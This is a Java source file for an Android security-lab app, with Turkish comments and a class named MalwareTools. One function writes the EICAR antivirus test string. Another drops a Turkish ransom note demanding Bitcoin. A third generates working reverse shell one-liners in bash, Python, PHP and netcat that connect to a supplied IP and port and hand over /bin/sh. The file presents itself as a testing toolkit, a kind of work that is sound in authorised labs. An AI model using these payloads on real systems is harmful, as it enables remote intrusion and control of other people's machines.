package com.example.karageyazilimsecuritylab;

import android.content.Context;
import java.io.FileOutputStream;

public class MalwareTools {

    // 1. EICAR TEST VIRUS (Antivirüsleri Tetikler)
    public static String createVirusTestFile(Context context) {
        String eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        String filename = "virus_test.com";
        try {
            FileOutputStream fos = context.openFileOutput(filename, Context.MODE_PRIVATE);
            fos.write(eicar.getBytes());
            fos.close();
            return "[⚠️] VİRÜS DOSYASI OLUŞTURULDU: " + context.getFilesDir() + "/" + filename + "\n" +
                    "NOT: Bu dosya zararsızdır ama Antivirüsler bunu 'Virüs' olarak algılar.";
        } catch (Exception e) { return "Hata: Dosya oluşturulamadı."; }
    }

    // 2. RANSOMWARE SIMULATION (Fidye Yazılımı Notu Bırakır)
    public static String createRansomNote(Context context) {
        String note = "DOSYALARINIZ ŞİFRELENDİ!\nÖdeme yapmak için şu BTC adresine gönderin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\nKarage Security Lab.";
        try {
            FileSystemTools.createFile(context, "READ_ME_NOW.txt", note);
            return "[☠️] RANSOMWARE NOTU BIRAKILDI.";
        } catch (Exception e) { return "Hata."; }
    }

    // 3. REVERSE SHELL GENERATOR (Sızma Kodları)
    public static String generatePayload(String ip, String port, String type) {
        switch (type.toLowerCase()) {
            case "bash":
                return "BASH SHELL:\nbash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
            case "python":
                return "PYTHON SHELL:\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
            case "php":
                return "PHP SHELL:\nphp -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
            case "netcat":
                return "NETCAT SHELL:\nnc -e /bin/sh " + ip + " " + port;
            default:
                return "Hata: Türler -> bash, python, php, netcat";
        }
    }
}